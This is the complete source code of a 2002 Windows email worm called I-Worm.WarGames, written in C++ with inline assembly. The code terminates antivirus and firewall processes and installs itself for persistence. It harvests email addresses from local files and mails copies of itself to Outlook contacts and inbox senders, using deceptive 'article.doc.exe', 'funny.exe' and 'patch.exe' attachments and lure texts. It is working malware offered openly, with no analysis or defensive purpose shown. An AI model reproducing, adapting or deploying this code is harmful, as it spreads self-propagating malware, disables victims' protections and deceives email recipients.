/*
Name : I-Worm.WarGames
Author : PetiK
Date : February 12th 2002 - February 22th 2002
Language : C++/Win32asm
*/

#include <stdio.h>
#include <windows.h>
#include <mapi.h>
#include <tlhelp32.h>
#pragma argused
#pragma inline

char 	filename[100],sysdir[100],copyr[50]="w",winhtm[100],subj[50];
int	num,counter=0;
char	*alph[]={"a","b","c","d","e","f","g","h","i","j","k","l","m",
		 "n","o","p","q","r","s","t","u","v","w","x","y","z"};
char	dn[20]="Wargames Uninstall",ust[40]="rundll32 mouse,disable";
LPSTR 	SHFolder=".DEFAULT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
BYTE	desktop[50],favoris[50],personal[50],cache[50],page[150];
DWORD	sizcache=sizeof(desktop),sizfavoris=sizeof(favoris),
	sizpersonal=sizeof(personal),sizdesktop=sizeof(cache),spage=sizeof(page);
DWORD	type=REG_SZ;
FILE	*vbsworm,*winstart;
HANDLE	lSnapshot,myproc;
BOOL	rProcessFound;

LHANDLE session;
MapiMessage mess;
MapiMessage *mes;
MapiRecipDesc from;
char messId[512],mname[50],maddr[30];
HINSTANCE hMAPI;

WIN32_FIND_DATA		ffile;
PROCESSENTRY32 		uProcess;
HKEY			hReg;
SYSTEMTIME		wartime;

void StopAV(char *);
void FindFile(char *,char *);
void GetMail(char *,char *);
void sendmail(char *);

ULONG (PASCAL FAR *mSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
ULONG (PASCAL FAR *mLogoff)(LHANDLE, ULONG, FLAGS, ULONG);
ULONG (PASCAL FAR *mLogon)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
ULONG (PASCAL FAR *mFindNext)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
ULONG (PASCAL FAR *mReadMail)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR *);
ULONG (PASCAL FAR *mFreeBuffer)(LPVOID);

int WINAPI WinMain (HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{
// Kill Some AntiVirus
StopAV("AVP32.EXE");		// AVP
StopAV("AVPCC.EXE");		// AVP
StopAV("AVPM.EXE");		// AVP
StopAV("WFINDV32.EXE");		// Dr. Solomon
StopAV("F-AGNT95.EXE");		// F-Secure
StopAV("NAVAPW32.EXE");		// Norton Antivirus
StopAV("NAVW32.EXE");		// Norton Antivirus
StopAV("NMAIN.EXE");		// Norton Antivirus
StopAV("PAVSCHED.EXE");		// Panda AntiVirus
StopAV("ZONEALARM.EXE");	// ZoneAlarm

// Kill Some Worm
StopAV("KERN32.EXE");		// I-Worm.Badtrans
StopAV("SETUP.EXE");		// I-Worm.Cholera
StopAV("RUNDLLW32.EXE");	// I-Worm.Gift
StopAV("GONER.SCR");		// I-Worm.Goner
StopAV("LOAD.EXE");		// I-Worm.Nimda
StopAV("INETD.EXE");		// I-Worm.Plage - BadTrans
StopAV("FILES32.VXD");		// I-Worm.PrettyPark
StopAV("SCAM32.EXE");		// I-Worm.Sircam
StopAV("GDI32.EXE");		// I-Worm.Sonic
StopAV("_SETUP.EXE");		// I-Worm.ZippedFiles
StopAV("EXPLORE.EXE");		// I-Worm.ZippedFiles
StopAV("ZIPPED_FILES.EXE");	// I-Worm.ZippedFiles

GetModuleFileName(hInst,filename,100);
GetSystemDirectory((char *)sysdir,100);
SetCurrentDirectory(sysdir);
CopyFile(filename,"article.doc.exe",TRUE);
RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\WarGames Worm",&hReg);
RegSetValueEx(hReg,"DisplayName",0,REG_SZ,(BYTE *)dn,20);
RegSetValueEx(hReg,"UninstallString",0,REG_SZ,(BYTE *)ust,40);
RegCloseKey(hReg);

randomize();
num=rand() % 10;
randname:
strcat(copyr,alph[GetTickCount()%25]);
if(++counter==num) {
	strcat(copyr,".exe");
	MessageBox(NULL,copyr,"New Copy Name:",MB_OK|MB_ICONINFORMATION);
	CopyFile(filename,copyr,FALSE);
	WriteProfileString("WINDOWS","RUN",copyr);
	WritePrivateProfileString("rename","NUL",filename,"WININIT.INI");
	goto endrandname;
	}
Sleep(GetTickCount()%100);
goto randname;
endrandname:

hMAPI=LoadLibrary("MAPI32.DLL");
(FARPROC &)mSendMail=GetProcAddress(hMAPI, "MAPISendMail");
RegOpenKeyEx(HKEY_USERS,SHFolder,0,KEY_QUERY_VALUE,&hReg);
RegQueryValueEx(hReg,"Desktop",0,&type,desktop,&sizdesktop);
RegQueryValueEx(hReg,"Favorites",0,&type,favoris,&sizfavoris);
RegQueryValueEx(hReg,"Personal",0,&type,personal,&sizpersonal);
RegQueryValueEx(hReg,"Cache",0,&type,cache,&sizcache);
RegCloseKey(hReg);
GetWindowsDirectory((char *)winhtm,100);

_asm
{
call	@wininet
db	"WININET.DLL",0
@wininet:
call	LoadLibrary
test	eax,eax
jz	end_asm
mov	ebp,eax
call	@inetconnect
db	"InternetGetConnectedState",0
@inetconnect:
push	ebp
call	GetProcAddress
test	eax,eax
jz	end_wininet
mov	edi,eax
verf:
push	0
push	Tmp
call	edi
dec	eax
jnz	verf

end_wininet:
push	ebp
call	FreeLibrary
end_asm:
jmp	end_all_asm

Tmp	dd 0

end_all_asm:
}

FindFile(desktop,"*.htm");
FindFile(desktop,"*.doc");
FindFile(favoris,"*.ht*");
FindFile(personal,"*.ht*");
FindFile(personal,"*.doc");
FindFile(personal,"*.xls");
FindFile(personal,"*.asp");
FindFile(cache,".ht*");
FindFile(cache,".php");
FindFile(cache,".asp");
FindFile(winhtm,".ht*");
FindFile(winhtm,".doc");


vbsworm=fopen("wargames.vbs","w");
fprintf(vbsworm,"On Error Resume Next\n");
fprintf(vbsworm,"msgbox %cScripting.FileSystemObject%c\n",34,34);
fprintf(vbsworm,"Set sf=CreateObject(%cScripting.FileSystemObject%c)\n",34,34);
fprintf(vbsworm,"Set sys=sf.GetSpecialFolder(1)\n");
fprintf(vbsworm,"Set OA=CreateObject(%cOutlook.Application%c)\n",34,34);
fprintf(vbsworm,"Set MA=OA.GetNameSpace(%cMAPI%c)\n",34,34);
fprintf(vbsworm,"For Each C In MA.AddressLists\n");
fprintf(vbsworm,"If C.AddressEntries.Count <> 0 Then\n");
fprintf(vbsworm,"For D=1 To C.AddressEntries.Count\n");
fprintf(vbsworm,"Set AD=C.AddressEntries(D)\n");
fprintf(vbsworm,"Set EM=OA.CreateItem(0)\n");
fprintf(vbsworm,"EM.To=AD.Address\n");
fprintf(vbsworm,"EM.Subject=%cHi %c&AD.Name&%c read this.%c\n",34,34,34,34);
fprintf(vbsworm,"body=%cI found this on the web and it is important.%c\n",34,34);
fprintf(vbsworm,"body = body & VbCrLf & %cOpen the attached file and read.%c\n",34,34);
fprintf(vbsworm,"EM.Body=body\n");
fprintf(vbsworm,"EM.Attachments.Add(sys&%c\\article.doc.exe%c)\n",34,34);
fprintf(vbsworm,"EM.DeleteAfterSubmit=True\n");
fprintf(vbsworm,"If EM.To <> %c%c Then\n",34,34);
fprintf(vbsworm,"EM.Send\n");
fprintf(vbsworm,"End If\n");
fprintf(vbsworm,"Next\n");
fprintf(vbsworm,"End If\n");
fprintf(vbsworm,"Next\n");
fclose(vbsworm);
ShellExecute(NULL,"open","wargames.vbs",NULL,NULL,SW_SHOWNORMAL);
Sleep(5000);
DeleteFile("wargames.vbs");

(FARPROC &)mLogon=GetProcAddress(hMAPI, "MAPILogon");
(FARPROC &)mLogoff=GetProcAddress(hMAPI, "MAPILogoff");
(FARPROC &)mFindNext=GetProcAddress(hMAPI, "MAPIFindNext");
(FARPROC &)mReadMail=GetProcAddress(hMAPI, "MAPIReadMail");
(FARPROC &)mFreeBuffer=GetProcAddress(hMAPI, "MAPIFreeBuffer");
mLogon(NULL,NULL,NULL,MAPI_NEW_SESSION,NULL,&session);
if(mFindNext(session,0,NULL,NULL,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS) {
  do {
     if(mReadMail(session,NULL,messId,MAPI_ENVELOPE_ONLY|MAPI_PEEK,NULL,&mes)==SUCCESS_SUCCESS) {
	strcpy(mname,mes->lpOriginator->lpszName);
	strcpy(maddr,mes->lpOriginator->lpszAddress);
	mes->ulReserved=0;
	mes->lpszSubject="Re: Fw:";
	mes->lpszNoteText="I received your mail but I cannot reply immediatly.\n"
				"I send you a nice program. Look at this.\n\n"
				"	See you soon.";
	mes->lpszMessageType=NULL;
	mes->lpszDateReceived=NULL;
	mes->lpszConversationID=NULL;
	mes->flFlags=MAPI_SENT;
	mes->lpOriginator->ulReserved=0;
	mes->lpOriginator->ulRecipClass=MAPI_ORIG;
	mes->lpOriginator->lpszName=mes->lpRecips->lpszName;
	mes->lpOriginator->lpszAddress=mes->lpRecips->lpszAddress;
	mes->nRecipCount=1;
	mes->lpRecips->ulReserved=0;
	mes->lpRecips->ulRecipClass=MAPI_TO;
	mes->lpRecips->lpszName=mname;
	mes->lpRecips->lpszAddress=maddr;
	mes->nFileCount=1;
	mes->lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
	memset(mes->lpFiles, 0, sizeof(MapiFileDesc));
	mes->lpFiles->ulReserved=0;
	mes->lpFiles->flFlags=NULL;
	mes->lpFiles->nPosition=-1;
	mes->lpFiles->lpszPathName=filename;
	mes->lpFiles->lpszFileName="funny.exe";
	mes->lpFiles->lpFileType=NULL;
	mSendMail(session, NULL, mes, NULL, NULL);
	}
  }while(mFindNext(session,0,NULL,messId,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS);
free(mes->lpFiles);
mFreeBuffer(mes);
mLogoff(session,0,0,0);
FreeLibrary(hMAPI);
}


}

void FindFile(char *folder, char *ext)
{
register bool abc=TRUE;
register HANDLE hFile;
char mail[128];
SetCurrentDirectory(folder);
hFile=FindFirstFile(ext,&ffile);
if(hFile!=INVALID_HANDLE_VALUE) {
	while(abc) {
	SetFileAttributes(ffile.cFileName,FILE_ATTRIBUTE_ARCHIVE);
	GetMail(ffile.cFileName,mail);
	if(strlen(mail)>0) {
	sendmail(mail);
	}
	abc=FindNextFile(hFile,&ffile);
	}
}

}

void GetMail(char *namefile, char *mail)
{
HANDLE	hf,hf2;
char	*mapped;
DWORD	size,i,k;
BOOL	test=FALSE,valid=FALSE;
mail[0]=0;

hf=CreateFile(namefile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,0);
if(hf==INVALID_HANDLE_VALUE)
	return;
size=GetFileSize(hf,NULL);
if(!size)
	return;
if(size<8)
	return;
size-=100;

hf2=CreateFileMapping(hf,0,PAGE_READONLY,0,0,0);
if(!hf2) {
	CloseHandle(hf);
	return;
	}

mapped=(char *)MapViewOfFile(hf2,FILE_MAP_READ,0,0,0);
if(!mapped) {
	CloseHandle(hf2);
	CloseHandle(hf);
	return;
	}

i=0;
while(i<size && !test) {
if(!strncmpi("mailto:",mapped+i,strlen("mailto:"))) {
	test=TRUE;
	i+=strlen("mailto:");
	k=0;
	while(mapped[i]!=34 && mapped[i]!=39 && i<size && k<127) {
		if(mapped[i]!=' ') {
			mail[k]=mapped[i];
			k++;
			if(mapped[i]=='@')
				valid=TRUE;
		}
		i++;
	}
	mail[k]=0;
	} else
	i++;
}

if(!valid)
	mail[0]=0;
UnmapViewOfFile(mapped);
CloseHandle(hf2);
CloseHandle(hf);
return;
}

void sendmail(char *tos)
{
memset(&mess,0,sizeof(MapiMessage));
memset(&from,0,sizeof(MapiRecipDesc));
wsprintf(subj,"Mail to %s.",tos);

from.lpszName=NULL;
from.ulRecipClass=MAPI_ORIG;
mess.lpszSubject=subj;
mess.lpszNoteText="I send you this patch.\n"
		"It corrects a bug into Internet Explorer and Outlook.\n\n"
		"	Have a nice day. Best Regards.";

mess.lpRecips=(MapiRecipDesc *)malloc(sizeof(MapiRecipDesc));
	if(!mess.lpRecips)
	return;
memset(mess.lpRecips,0,sizeof(MapiRecipDesc));
mess.lpRecips->lpszName=tos;
mess.lpRecips->lpszAddress=tos;
mess.lpRecips->ulRecipClass=MAPI_TO;
mess.nRecipCount=1;

mess.lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
	if(!mess.lpFiles)
	return;
memset(mess.lpFiles,0,sizeof(MapiFileDesc));
mess.lpFiles->lpszPathName=filename;
mess.lpFiles->lpszFileName="patch.exe";
mess.nFileCount=1;

mess.lpOriginator=&from;

mSendMail(0,0,&mess,0,0);

free(mess.lpRecips);
free(mess.lpFiles);
}

void StopAV(char *antivirus)
{
register BOOL term;
lSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
uProcess.dwSize=sizeof(uProcess);
rProcessFound=Process32First(lSnapshot,&uProcess);
while(rProcessFound) {
	if(strstr(uProcess.szExeFile,antivirus)!=NULL) {
		myproc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,uProcess.th32ProcessID);
		if(myproc!=NULL) {
			term=TerminateProcess(myproc,0);
		}
		CloseHandle(myproc);
	}
	rProcessFound=Process32Next(lSnapshot,&uProcess);
}
CloseHandle(lSnapshot);
}
